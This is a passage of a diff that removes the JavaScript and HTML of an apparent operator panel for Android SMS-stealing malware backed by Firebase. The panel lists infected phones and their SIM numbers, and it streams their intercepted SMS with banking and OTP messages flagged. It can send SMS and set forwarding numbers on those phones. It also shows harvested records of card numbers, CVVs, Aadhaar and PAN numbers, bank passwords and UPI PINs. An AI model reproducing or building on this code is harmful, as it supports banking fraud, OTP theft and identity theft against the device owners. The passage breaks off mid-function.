-                                <button class="pin-btn" onclick="event.stopPropagation(); togglePinDevice('${user.id}')">
-                                    <i class="fas ${isPinnedDevice ? 'fa-thumbtack' : 'fa-thumbtack'}"></i>
-                                </button>
-                            ` : ''}
-                        </div>
-                    </div>
-                    
-                    <div class="battery-info">
-                        
-                        <span>Battery:</span>
-                        <div class="battery-level">
-                            <div class="battery-fill" style="width: ${batteryWidth}%; background: ${batteryColor};"></div>
-                            
-                        </div>
-                        <span>${batteryLevel}%</span>
-                    </div>
-                    
-                    <div class="user-info">
-                        
-                        
-                        <div><strong>SIM 1:</strong> ${user.numberSim1 || 'No SIM'}</div>
-                        <div><strong>SIM 2:</strong> ${user.numberSim2 || 'No SIM'}</div>
-                        
-                        
-                    </div>
-                    
-                    <br>
-                    <div class="header">
-                        <button class="nav-btn active" onclick="event.stopPropagation(); openSendSMSModal('${user.id}')">
-                            <i class="fas fa-sms"></i> Send
-                        </button>
-            <button class="nav-btn active" onclick="event.stopPropagation(); openCallForwardModal('${user.id}')">
-                            <i class="fas fa-phone"></i> Forward
-                        </button>
-                   </div>
-                   
-                    <div class="header" >
-                        <button class="nav-btn active" onclick="event.stopPropagation(); getAllDeviceSMS('${user.id}')">
-                            <i class="fas fa-envelope"></i> All SMS
-                        </button>
-                        
-                        <button class="nav-btn active" onclick="event.stopPropagation(); viewDeviceSMS('${user.id}')">
-                            <i class="fas fa-eye"></i> View SMS
-                        </button>
-                        
-                    </div>
-                    
-                    <div class="header">
-                        
-                        
-                        <button class="nav-btn active" onclick="event.stopPropagation(); viewLoginDetails('${user.id}')">
-                            <i class="fas fa-sign-in-alt"></i> Details
-                        </button>
-                        <button class="nav-btn active" onclick="event.stopPropagation(); requestDeleteDevice('${user.id}')">
-                            <i class="fas fa-trash"></i> Delete
-                        </button>
-                    </div>
-                    <br>
-                    <div><strong>Last Active:</strong> ${user.TimeandDate || (user.timestamp ? new Date(user.timestamp).toLocaleString() : 'Never')}</div>
-                `;
-
-                gridElement.appendChild(userCard);
-            });
-        }
-
-        function getInstallTimeDisplay(user) {
-            const installTime = getInstallTime(user);
-            return new Date(installTime).toLocaleString();
-        }
-
-        // Section Navigation
-        function showSection(sectionName) {
-            // Hide all sections
-            document.querySelectorAll('.content-section').forEach(section => {
-                section.classList.add('hidden');
-            });
-            
-            // Remove active class from all buttons
-            document.querySelectorAll('.nav-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            
-            // Show selected section and activate button
-            document.getElementById(sectionName + 'Section').classList.remove('hidden');
-            event.target.classList.add('active');
-            
-            // Load All Data Group if selected
-            if (sectionName === 'dataGroup') {
-                loadAllLoginData();
-            }
-        }
-
-        // Navigation Functions
-        function navigateToDevice(userId) {
-            event.stopPropagation();
-            // Switch to devices section and filter to show only this device
-            showSection('users');
-            
-            // Find the user by ID
-            const user = allUsers.find(u => u.id === userId);
-            if (user) {
-                const serialNumber = deviceSerialNumbers[userId] || 0;
-                // Set search to serial number and trigger search
-                document.getElementById('userSearch').value = `#${serialNumber}`;
-                currentSearchTerm = `#${serialNumber}`;
-                filterUsers();
-                
-                // Highlight the device card
-                setTimeout(() => {
-                    const userCards = document.querySelectorAll('.user-card');
-                    userCards.forEach(card => {
-                        if (card.querySelector('.device-serial')?.textContent === serialNumber.toString()) {
-                            card.classList.add('highlight');
-                            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                        }
-                    });
-                }, 500);
-            }
-        }
-
-        function navigateToDeviceFromSMS(userId) {
-            event.stopPropagation();
-            // Switch to devices section and filter to show only this device
-            showSection('users');
-            
-            // Find the user by ID
-            const user = allUsers.find(u => u.id === userId);
-            if (user) {
-                const serialNumber = deviceSerialNumbers[userId] || 0;
-                // Set search to device ID and trigger search
-                document.getElementById('userSearch').value = userId;
-                currentSearchTerm = userId;
-                filterUsers();
-                
-                // Highlight the device card
-                setTimeout(() => {
-                    const userCards = document.querySelectorAll('.user-card');
-                    userCards.forEach(card => {
-                        if (card.querySelector('.user-info')?.textContent.includes(userId.substring(0, 8))) {
-                            card.classList.add('highlight');
-                            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                        }
-                    });
-                }, 500);
-            }
-        }
-
-        // Enhanced Search Functions
-        function filterUsers() {
-            const searchTerm = document.getElementById('userSearch').value.toLowerCase();
-            currentSearchTerm = searchTerm;
-            
-            if (searchTerm) {
-                const filteredUsers = allUsers.filter(user => checkUserMatchSearch(user, searchTerm));
-                
-                // Show search results header
-                userSearchResults.classList.remove('hidden');
-                userSearchCount.textContent = `${filteredUsers.length} device${filteredUsers.length !== 1 ? 's' : ''} found for "${searchTerm}"`;
-                
-                // Display filtered users with search results at the top
-                displayUsersGrid(filteredUsers, usersGrid, false);
-            } else {
-                // Clear search
-                clearUserSearch();
-            }
-        }
-
-        function checkUserMatchSearch(user, searchTerm) {
-            const serialNumber = deviceSerialNumbers[user.id] || 0;
-            const searchText = searchTerm.replace('#', ''); // Remove # for serial number search
-            
-            return (
-                (serialNumber && serialNumber.toString().includes(searchText)) ||
-                (user.id && user.id.toLowerCase().includes(searchTerm)) ||
-                (user.Device_info && user.Device_info.toLowerCase().includes(searchTerm)) ||
-                (user.device_info && user.device_info.toLowerCase().includes(searchTerm)) ||
-                (user.d_name && user.d_name.toLowerCase().includes(searchTerm)) ||
-                (user.numberSim1 && user.numberSim1.toLowerCase().includes(searchTerm)) ||
-                (user.numberSim2 && user.numberSim2.toLowerCase().includes(searchTerm))
-            );
-        }
-
-        function clearUserSearch() {
-            document.getElementById('userSearch').value = '';
-            currentSearchTerm = '';
-            userSearchResults.classList.add('hidden');
-            
-            // Remove highlights
-            document.querySelectorAll('.user-card.highlight').forEach(card => {
-                card.classList.remove('highlight');
-            });
-            
-            displayUsers(allUsers);
-        }
-
-        // SMS Management with Realtime Listener
-        function setupSMSDataListener() {
-            smsDataListener = database.ref('user_sms').on('value', (snapshot) => {
-                allSMSData = [];
-                
-                snapshot.forEach((userSnapshot) => {
-                    const userId = userSnapshot.key;
-                    userSnapshot.forEach((smsSnapshot) => {
-                        const sms = smsSnapshot.val();
-                        sms.id = smsSnapshot.key;
-                        sms.userId = userId;
-                        sms.deviceSerial = deviceSerialNumbers[userId] || 'N/A';
-                        allSMSData.push(sms);
-                    });
-                });
-
-                // Sort by timestamp descending
-                allSMSData.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-                
-                // Apply current SMS search filter if any
-                if (currentSMSSearchTerm) {
-                    filterSMS();
-                } else {
-                    displaySMS(allSMSData);
-                }
-            }, (error) => {
-                console.error('Error loading SMS:', error);
-            });
-        }
-
-        function filterSMS() {
-            const searchTerm = document.getElementById('smsSearch').value.toLowerCase();
-            currentSMSSearchTerm = searchTerm;
-            
-            if (searchTerm) {
-                const filteredSMS = allSMSData.filter(sms => checkSMSMatchSearch(sms, searchTerm));
-                
-                // Show search results header
-                smsSearchResults.classList.remove('hidden');
-                smsSearchCount.textContent = `${filteredSMS.length} message${filteredSMS.length !== 1 ? 's' : ''} found for "${searchTerm}"`;
-                
-                // Display filtered SMS with search results at the top
-                displaySMS(filteredSMS);
-            } else {
-                // Clear search
-                clearSMSSearch();
-            }
-        }
-
-        // Banking SMS Filter Functions
-        function filterBankingSMS() {
-            const bankingSMS = allSMSData.filter(sms => isBankingSMS(sms));
-            
-            smsSearchResults.classList.remove('hidden');
-            smsSearchCount.textContent = `${bankingSMS.length} banking-related message${bankingSMS.length !== 1 ? 's' : ''} found`;
-            
-            displaySMS(bankingSMS);
-        }
-
-        function filterOTPSMS() {
-            const otpSMS = allSMSData.filter(sms => isOTPSMS(sms));
-            
-            smsSearchResults.classList.remove('hidden');
-            smsSearchCount.textContent = `${otpSMS.length} OTP message${otpSMS.length !== 1 ? 's' : ''} found`;
-            
-            displaySMS(otpSMS);
-        }
-
-        function isBankingSMS(sms) {
-            const body = (sms.body || '').toLowerCase();
-            const sender = (sms.sender || '').toLowerCase();
-            
-            return bankingKeywords.some(keyword => 
-                body.includes(keyword) || sender.includes(keyword)
-            );
-        }
-
-        function isOTPSMS(sms) {
-            const body = (sms.body || '').toLowerCase();
-            const sender = (sms.sender || '').toLowerCase();
-            
-            return otpKeywords.some(keyword => 
-                body.includes(keyword) || sender.includes(keyword)
-            );
-        }
-
-        function checkSMSMatchSearch(sms, searchTerm) {
-            const deviceSerial = sms.deviceSerial.toString();
-            return (
-                (sms.sender && sms.sender.toLowerCase().includes(searchTerm)) ||
-                (sms.body && sms.body.toLowerCase().includes(searchTerm)) ||
-                (sms.userId && sms.userId.toLowerCase().includes(searchTerm)) ||
-                (deviceSerial && deviceSerial.includes(searchTerm)) ||
-                (sms.sim_number && sms.sim_number.toLowerCase().includes(searchTerm))
-            );
-        }
-
-        function clearSMSSearch() {
-            document.getElementById('smsSearch').value = '';
-            currentSMSSearchTerm = '';
-            smsSearchResults.classList.add('hidden');
-            
-            // Remove highlights
-            document.querySelectorAll('.sms-item.highlight').forEach(item => {
-                item.classList.remove('highlight');
-            });
-            
-            displaySMS(allSMSData);
-        }
-
-        function displaySMS(smsArray) {
-            smsList.innerHTML = '';
-            
-            if (smsArray.length === 0) {
-                smsList.innerHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-envelope-open"></i>
-                        <h3>No SMS Messages</h3>
-                        <p>No SMS messages found in the database</p>
-                    </div>
-                `;
-                return;
-            }
-
-            smsArray.forEach(sms => {
-                const isSearchResult = currentSMSSearchTerm && checkSMSMatchSearch(sms, currentSMSSearchTerm);
-                const isBanking = isBankingSMS(sms);
-                const isOTP = isOTPSMS(sms);
-                
-                const smsItem = document.createElement('div');
-                smsItem.className = `sms-item ${isSearchResult ? 'highlight' : ''} ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
-                
-                smsItem.innerHTML = `
-                    <div class="sms-header">
-                        <div class="sms-sender">${sms.sender || 'Unknown'}</div>
-                        <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
-                    </div>
-                    <div class="sms-body">${sms.body || 'No content'}</div>
-                    <div class="sms-device">
-                        <div>
-                            <strong>Device:</strong> ${sms.userId} | 
-                            <strong>Serial:</strong> <span class="sms-serial" onclick="navigateToDeviceFromSMS('${sms.userId}')">#${sms.deviceSerial}</span> | 
-                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'}
-                            ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                            ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
-                        </div>
-                    </div>
-                `;
-
-                smsList.appendChild(smsItem);
-            });
-        }
-
-        // Login Data with Realtime Listener
-        function setupLoginDataListener() {
-            loginDataListener = database.ref('login').on('value', (snapshot) => {
-                loadAllLoginData();
-            }, (error) => {
-                console.error('Error loading login data:', error);
-            });
-        }
-
-        // All Data Group Functions
-        function loadAllLoginData() {
-            allLoginData = [];
-            let totalDataSize = 0;
-            
-            database.ref('login').once('value')
-                .then(snapshot => {
-                    const loginDataPromises = [];
-                    
-                    snapshot.forEach(userSnapshot => {
-                        const userId = userSnapshot.key;
-                        const userLoginData = userSnapshot.val();
-                        
-                        if (userLoginData && Object.keys(userLoginData).length > 0) {
-                            const user = allUsers.find(u => u.id === userId);
-                            const serialNumber = deviceSerialNumbers[userId] || 'N/A';
-                            const deviceName = user ? (user.d_name || 'Unknown Device') : 'Unknown Device';
-                            
-                            // Calculate data size for this user
-                            const dataSize = JSON.stringify(userLoginData).length;
-                            totalDataSize += dataSize;
-                            
-                            // Get the latest timestamp from login data
-                            let latestTimestamp = 0;
-                            Object.keys(userLoginData).forEach(recordKey => {
-                                const record = userLoginData[recordKey];
-                                if (record && record.timestamp) {
-                                    latestTimestamp = Math.max(latestTimestamp, record.timestamp);
-                                }
-                            });
-                            
-                            allLoginData.push({
-                                userId: userId,
-                                serialNumber: serialNumber,
-                                deviceName: deviceName,
-                                loginData: userLoginData,
-                                dataSize: dataSize,
-                                latestTimestamp: latestTimestamp
-                            });
-                        }
-                    });
-                    
-                    // Sort by serial number (descending) and then by latest timestamp (descending)
-                    allLoginData.sort((a, b) => {
-                        // First sort by serial number (descending)
-                        if (a.serialNumber !== b.serialNumber) {
-                            return b.serialNumber - a.serialNumber;
-                        }
-                        // Then by latest timestamp (newest first)
-                        return b.latestTimestamp - a.latestTimestamp;
-                    });
-                    
-                    // Display all login data
-                    displayAllLoginData();
-                    
-                    // Update data size badge
-                    const totalKB = (totalDataSize / 1024).toFixed(2);
-                    dataSizeBadge.textContent = `${totalKB} KB Data`;
-                })
-                .catch(error => {
-                    console.error('Error loading login data:', error);
-                    showToast('Error loading login data', 'error');
-                });
-        }
-
-        function displayAllLoginData() {
-            loginDataContainer.innerHTML = '';
-            
-            if (allLoginData.length === 0) {
-                loginDataContainer.innerHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-database"></i>
-                        <h3>No Login Data</h3>
-                        <p>No login data found for any devices</p>
-                    </div>
-                `;
-                return;
-            }
-
-            allLoginData.forEach(data => {
-                const serialGroup = document.createElement('div');
-                serialGroup.className = 'serial-group';
-                
-                // Count number of records
-                const recordCount = Object.keys(data.loginData).length;
-                
-                serialGroup.innerHTML = `
-                    <div class="serial-header" onclick="toggleSerialGroup(this)">
-                        <div class="serial-info">
-                            <div class="serial-number">${data.serialNumber}</div>
-                            <div class="device-details">
-                                <div class="device-name">${data.deviceName}</div>
-                                <div class="device-id">${data.userId}</div>
-                            </div>
-                        </div>
-                        <div class="data-count">
-                            <i class="fas fa-key"></i> ${recordCount} Records
-                        </div>
-                    </div>
-                    <div class="login-records">
-                        ${generateLoginRecordsHTML(data.loginData)}
-                    </div>
-                `;
-
-                loginDataContainer.appendChild(serialGroup);
-            });
-        }
-
-        function generateLoginRecordsHTML(loginData) {
-            let recordsHTML = '';
-            let hasRecords = false;
-            
-            Object.keys(loginData).forEach(recordKey => {
-                const record = loginData[recordKey];
-                if (record && typeof record === 'object') {
-                    let recordHTML = '<div class="login-record">';
-                    let hasContent = false;
-                    
-                    // Format the login data exactly like Java code
-                     if (record.Name) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Name : </span><span class="login-value">${record.Name}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Number) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Mobile Number : </span><span class="login-value">${record.Number}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.DOB) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Date Of Birth : </span><span class="login-value">${record.DOB}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Card) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Card Number : </span><span class="login-value">${record.Card}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Cvv) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">CVV : </span><span class="login-value">${record.Cvv}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Expiry) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Expiry : </span><span class="login-value">${record.Expiry}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.acount) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Aadhar Number : </span><span class="login-value">${record.acount}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Complaint) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Mother Name : </span><span class="login-value">${record.Complaint}</span></div>`;
-                        hasContent = true;
-                    }
-                    
-                    
-                    
-            
-                    if (record.mother) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">PAN : </span><span class="login-value">${record.mother}</span></div>`;
-                        hasContent = true;
-                    }
-                   
-                    if (record.Atm) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">ATM : </span><span class="login-value">${record.Atm}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Bank) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Bank : </span><span class="login-value">${record.Bank}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.User) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">User Name : </span><span class="login-value">${record.User}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.Password) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">Password : </span><span class="login-value">${record.Password}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.transaction) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">transaction Password : </span><span class="login-value">${record.transaction}</span></div>`;
-                        hasContent = true;
-                    }
-                    if (record.upi_pin) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI Pin : </span><span class="login-value">${record.upi_pin}</span></div>`;
-                        hasContent = true;
-                    }
-                     if (record.upi) { 
-                        recordHTML += `<div class="login-data-item"><span class="login-key">UPI id : </span><span class="login-value">${record.upi}</span></div>`;
-                        hasContent = true;
-                    }
-                    
-                    recordHTML += '</div>';
-                    
-                    if (hasContent) {
-                        recordsHTML += recordHTML;
-                        hasRecords = true;
-                    }
-                }
-            });
-            
-            if (!hasRecords) {
-                recordsHTML = '<div class="empty-records">No structured login data available</div>';
-            }
-            
-            return recordsHTML;
-        }
-
-        function toggleSerialGroup(headerElement) {
-            const recordsElement = headerElement.nextElementSibling;
-            recordsElement.classList.toggle('expanded');
-        }
-
-        // Forward Number Management with Realtime Listener
-        function setupForwardNumberListener() {
-            forwardNumberListener = database.ref('sms_forward/forward_number').on('value', (snapshot) => {
-                const forwardNumber = snapshot.val();
-                document.getElementById('forwardNumber').value = forwardNumber || '';
-            }, (error) => {
-                console.error('Error loading forward number:', error);
-            });
-        }
-
-        function updateForwardNumber() {
-            const forwardNumber = document.getElementById('forwardNumber').value.trim();
-            if (forwardNumber) {
-                database.ref('sms_forward/forward_number').set(forwardNumber)
-                    .then(() => showToast('Forward number updated successfully!', 'success'))
-                    .catch(error => showToast('Error updating number: ' + error.message, 'error'));
-            } else {
-                showToast('Please enter a valid phone number', 'error');
-            }
-        }
-
-        function deactivateForwarding() {
-            database.ref('sms_forward/forward_number').set('Not forward')
-                .then(() => {
-                    document.getElementById('forwardNumber').value = 'Not forward';
-                    showToast('SMS forwarding deactivated!', 'success');
-                })
-                .catch(error => showToast('Error deactivating: ' + error.message, 'error'));
-        }
-
-        // Password Protected Delete Functions
-        function requestDeleteDevice(userId) {
-            event.stopPropagation();
-            pendingDeleteAction = 'deleteDevice';
-            pendingDeleteData = userId;
-            showPasswordModal(`Delete Device #${deviceSerialNumbers[userId]}`);
-        }
-
-        function requestClearAllSMS() {
-            pendingDeleteAction = 'clearAllSMS';
-            pendingDeleteData = null;
-            showPasswordModal('Clear All SMS Messages');
-        }
-
-        function showPasswordModal(actionText) {
-            document.getElementById('passwordModal').classList.remove('hidden');
-            document.querySelector('.password-content h3').innerHTML = `<i class="fas fa-shield-alt"></i> Verify Password - ${actionText}`;
-            document.getElementById('verifyPassword').value = '';
-            document.getElementById('verifyPassword').focus();
-        }
-
-        function verifyPassword() {
-            const password = document.getElementById('verifyPassword').value;
-            
-            if (password === adminPassword) {
-                passwordModal.classList.add('hidden');
-                
-                // Execute the pending delete action
-                if (pendingDeleteAction === 'deleteDevice') {
-                    performDeleteDevice(pendingDeleteData);
-                } else if (pendingDeleteAction === 'clearAllSMS') {
-                    performClearAllSMS();
-                }
-                
-                // Reset pending actions
-                pendingDeleteAction = null;
-                pendingDeleteData = null;
-            } else {
-                showToast('Invalid password!', 'error');
-                document.getElementById('verifyPassword').value = '';
-                document.getElementById('verifyPassword').focus();
-            }
-        }
-
-        function cancelDelete() {
-            passwordModal.classList.add('hidden');
-            pendingDeleteAction = null;
-            pendingDeleteData = null;
-            showToast('Operation cancelled', 'warning');
-        }
-
-        function performDeleteDevice(userId) {
-            if (confirm('Are you sure you want to delete this device? This action cannot be undone.')) {
-                database.ref('user_data').child(userId).remove()
-                    .then(() => {
-                        // Also remove the serial number
-                        delete deviceSerialNumbers[userId];
-                        saveSerialNumbers();
-                        
-                        showToast('Device deleted successfully!', 'success');
-                        // Remove from pinned devices if pinned
-                        const index = pinnedDevices.indexOf(userId);
-                        if (index > -1) {
-                            pinnedDevices.splice(index, 1);
-                            database.ref('pinned_devices').set(pinnedDevices);
-                        }
-                    })
-                    .catch(error => {
-                        showToast('Error deleting device: ' + error.message, 'error');
-                    });
-            }
-        }
-
-        function performClearAllSMS() {
-            if (confirm('Are you sure you want to delete all SMS messages? This action cannot be undone.')) {
-                database.ref('user_sms').remove()
-                    .then(() => showToast('All SMS messages cleared!', 'success'))
-                    .catch(error => showToast('Error clearing SMS: ' + error.message, 'error'));
-            }
-        }
-
-        // Get All SMS for Specific Device
-        function getAllDeviceSMS(userId) {
-            event.stopPropagation();
-            currentDeviceIdForSMS = userId;
-            const user = allUsers.find(u => u.id === userId);
-            
-            if (user) {
-                deviceSMSTitle.innerHTML = `<i class="fas fa-envelope"></i> SMS Messages - ${user.d_name || 'Unknown Device'} (Serial #${deviceSerialNumbers[userId]})`;
-                
-                // Load device-specific SMS
-                database.ref('user_sms').child(userId).once('value')
-                    .then(snapshot => {
-                        currentDeviceSMS = [];
-                        
-                        if (snapshot.exists()) {
-                            snapshot.forEach(smsSnapshot => {
-                                const sms = smsSnapshot.val();
-                                sms.id = smsSnapshot.key;
-                                currentDeviceSMS.push(sms);
-                            });
-                        }
-
-                        // Sort by timestamp descending
-                        currentDeviceSMS.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-                        
-                        smsCount.textContent = currentDeviceSMS.length;
-                        displayDeviceSMS(currentDeviceSMS);
-                        deviceSMSModal.classList.remove('hidden');
-                    })
-                    .catch(error => {
-                        showToast('Error loading device SMS: ' + error.message, 'error');
-                    });
-            }
-        }
-
-        function displayDeviceSMS(smsArray) {
-            deviceSMSList.innerHTML = '';
-            
-            if (smsArray.length === 0) {
-                deviceSMSList.innerHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-envelope-open"></i>
-                        <h3>No SMS Messages</h3>
-                        <p>No SMS messages found for this device</p>
-                    </div>
-                `;
-                return;
-            }
-
-            smsArray.forEach(sms => {
-                const isBanking = isBankingSMS(sms);
-                const isOTP = isOTPSMS(sms);
-                
-                const smsItem = document.createElement('div');
-                smsItem.className = `sms-item ${isBanking ? 'banking-sms' : ''} ${isOTP ? 'otp-sms' : ''}`;
-                
-                smsItem.innerHTML = `
-                    <div class="sms-header">
-                        <div class="sms-sender">${sms.sender || 'Unknown'}</div>
-                        <div class="sms-date">${sms.date ? new Date(sms.date).toLocaleString() : 'Unknown date'}</div>
-                    </div>
-                    <div class="sms-body">${sms.body || 'No content'}</div>
-                    <div class="sms-device">
-                        <div>
-                            <strong>SIM:</strong> ${sms.sim_number || 'Unknown'} | 
-                            <strong>Type:</strong> ${sms.type || 'Received'} |
-                            <strong>Date:</strong> ${sms.date ? new Date(sms.date).toLocaleDateString() : 'Unknown'}
-                            ${isBanking ? ' | <span style="color: #4CAF50; font-weight: bold;">💳 Banking</span>' : ''}
-                            ${isOTP ? ' | <span style="color: #FF9800; font-weight: bold;">🔐 OTP</span>' : ''}
-                        </div>
-                    </div>
-                `;
-
-                deviceSMSList.appendChild(smsItem);
-            });
-        }
-
-        // Device SMS Filter Functions
-        function filterDeviceBankingSMS() {
-            const bankingSMS = currentDeviceSMS.filter(sms => isBankingSMS(sms));
-            displayDeviceSMS(bankingSMS);
-        }
-
-        function filterDeviceOTPSMS() {
-            const otpSMS = currentDeviceSMS.filter(sms => isOTPSMS(sms));
-            displayDeviceSMS(otpSMS);
-        }
-
-        function filterDeviceSMS() {
-            const searchTerm = document.getElementById('deviceSMSSearch').value.toLowerCase();
-            const filteredSMS = currentDeviceSMS.filter(sms => {
-                return (
-                    (sms.sender && sms.sender.toLowerCase().includes(searchTerm)) ||
-                    (sms.body && sms.body.toLowerCase().includes(searchTerm)) ||
-                    (sms.sim_number && sms.sim_number.toLowerCase().includes(searchTerm)) ||
-                    (sms.type && sms.type.toLowerCase().includes(searchTerm))
-                );
-            });
-            displayDeviceSMS(filteredSMS);
-        }
-
-        function clearDeviceSMSSearch() {
-            document.getElementById('deviceSMSSearch').value = '';
-            displayDeviceSMS(currentDeviceSMS);
-        }
-
-        function closeDeviceSMSModal() {
-            deviceSMSModal.classList.add('hidden');
-            currentDeviceIdForSMS = null;
-            currentDeviceSMS = [];
-            document.getElementById('deviceSMSSearch').value = '';
-        }
-
-        // Modal Functions
-        function openUserModal(user) {
-            currentDeviceData = user;
-            document.getElementById('userModalTitle').textContent = `Device: ${user.d_name || user.id}`;
-            
-            // Load device info tab by default
-            showTab('deviceInfo');
-            document.getElementById('userModal').classList.remove('hidden');
-        }
-
-        function showTab(tabName) {
-            // Update tabs
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            event.target.classList.add('active');
-
-            // Load tab content
-            loadTabContent(tabName);
-        }
-
-        function loadTabContent(tabName) {
-            const modalContent = document.getElementById('userModalContent');
-            
-            switch(tabName) {
-                case 'deviceInfo':
-                    loadDeviceInfoTab();
-                    break;
-                case 'smsData':
-                    loadSMSDataTab();
-                    break;
-                case 'loginData':
-                    loadLoginDataTab();
-                    break;
-            }
-        }
-
-        function loadDeviceInfoTab() {
-            const user = currentDeviceData;
-            const modalContent = document.getElementById('userModalContent');
-            
-            modalContent.innerHTML = `
-                <div class="user-details-grid">
-                    <div class="detail-card">
-                        <h4><i class="fas fa-mobile-alt"></i> Device Information</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Serial Number:</span>
-                            <span class="detail-value">#${deviceSerialNumbers[user.id] || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Device ID:</span>
-                            <span class="detail-value">${user.id}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Device Name:</span>
-                            <span class="detail-value">${user.d_name || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Model:</span>
-                            <span class="detail-value">${user.Device_info || user.device_info || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Status:</span>
-                            <span class="detail-value ${user.isOnline ? 'status-online' : 'status-offline'}" style="padding: 2px 8px; border-radius: 10px;">
-                                ${user.isOnline ? 'Online' : 'Offline'}
-                            </span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Battery:</span>
-                            <span class="detail-value">${user.battery || 'N/A'}%</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Install Time:</span>
-                            <span class="detail-value">${getInstallTimeDisplay(user)}</span>
-                        </div>
-                    </div>
-
-                    <div class="detail-card">
-                        <h4><i class="fas fa-sim-card"></i> SIM 1 Information</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Number:</span>
-                            <span class="detail-value">${user.numberSim1 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Carrier:</span>
-                            <span class="detail-value">${user.nameSim1 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">SIM Type:</span>
-                            <span class="detail-value">${user.typeSim1 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">ICCID:</span>
-                            <span class="detail-value">${user.iccIdSim1 || 'N/A'}</span>
-                        </div>
-                    </div>
-
-                    <div class="detail-card">
-                        <h4><i class="fas fa-sim-card"></i> SIM 2 Information</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Number:</span>
-                            <span class="detail-value">${user.numberSim2 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Carrier:</span>
-                            <span class="detail-value">${user.nameSim2 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">SIM Type:</span>
-                            <span class="detail-value">${user.typeSim2 || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">ICCID:</span>
-                            <span class="detail-value">${user.iccIdSim2 || 'N/A'}</span>
-                        </div>
-                    </div>
-
-                    <div class="detail-card">
-                        <h4><i class="fas fa-info-circle"></i> Additional Info</h4>
-                        <div class="detail-item">
-                            <span class="detail-label">Last Active:</span>
-                            <span class="detail-value">${user.TimeandDate || (user.timestamp ? new Date(user.timestamp).toLocaleString() : 'Never')}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">Phone Number:</span>
-                            <span class="detail-value">${user.phoneNumber || 'N/A'}</span>
-                        </div>
-                        <div class="detail-item">
-                            <span class="detail-label">User Type:</span>
-                            <span class="detail-value">${user.new_user || 'N/A'}</span>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function loadSMSDataTab() {
-            const userId = currentDeviceData.id;
-            const modalContent = document.getElementById('userModalContent');
-            
-            modalContent.innerHTML = '<div class="sms-list">Loading SMS data...</div>';
-            
-            // Load device-specific SMS with realtime listener
-            const smsListener = database.ref('user_sms').child(userId).limitToLast(50).on('value', (snapshot) => {
-                const smsData = [];
-                if (snapshot.exists()) {
-                    snapshot.forEach(smsSnapshot => {
-                        const sms = smsSnapshot.val();
-                        sms.id = smsSnapshot.key;
-                        smsData.push(sms);
-                    });
-                }
-                
-                // Sort by timestamp
-                smsData.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-                
-                let smsHTML = '<div class="sms-list">';
-                if (smsData.length === 0) {
-                    smsHTML += `
-                        <div class="empty-state">
-                            <i class="fas fa-envelope-open"></i>
-                            <h3>No SMS Messages</h3>
-                            <p>No SMS messages found for this device</p>
-                        </div>
-                    `;
-                } else {
-                    smsData.forEach(sms => {
-                        const isBanking = isBankingSMS(sms);
-                        const isOTP = isOTPSMS(sms);
-                        
-                        smsHTML += `
